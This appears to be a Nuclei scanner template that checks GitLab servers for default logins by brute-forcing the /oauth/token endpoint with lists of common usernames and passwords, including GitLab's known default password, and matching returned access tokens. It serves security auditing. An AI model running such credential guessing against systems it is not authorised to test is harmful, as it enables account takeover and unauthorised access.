http:
- attack: clusterbomb
  matchers:
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - application/json
  - condition: and
    part: body
    type: word
    words:
    - '"access_token":'
    - '"token_type":'
    - '"refresh_token":'
  matchers-condition: and
  payloads:
    password:
    - 5iveL!fe
    - root
    - admin
    - test
    - Test1234!@
    - password
    - '123456789'
    - '123456'
    username:
    - root
    - admin
    - test
    - admin@local.host
    - admin@localhost
    - admin@{{Host}}
  raw:
  - 'POST /oauth/token HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/plain, */*

    Referer: {{BaseURL}}

    content-type: application/json


    {"grant_type":"password","username":"{{username}}","password":"{{password}}"}

    '
id: gitlab-weak-login
info:
  author: Suman_Kar,dwisiswant0,reewardius
  classification:
    cwe-id: CWE-798
  description: Gitlab default login credentials were discovered.
  metadata:
    shodan-query: http.title:"GitLab"
  name: Gitlab Default Login
  reference:
  - https://twitter.com/0xmahmoudJo0/status/1467394090685943809
  - https://git-scm.com/book/en/v2/Git-on-the-Server-GitLab
  severity: high
  tags: gitlab,default-login,cloud
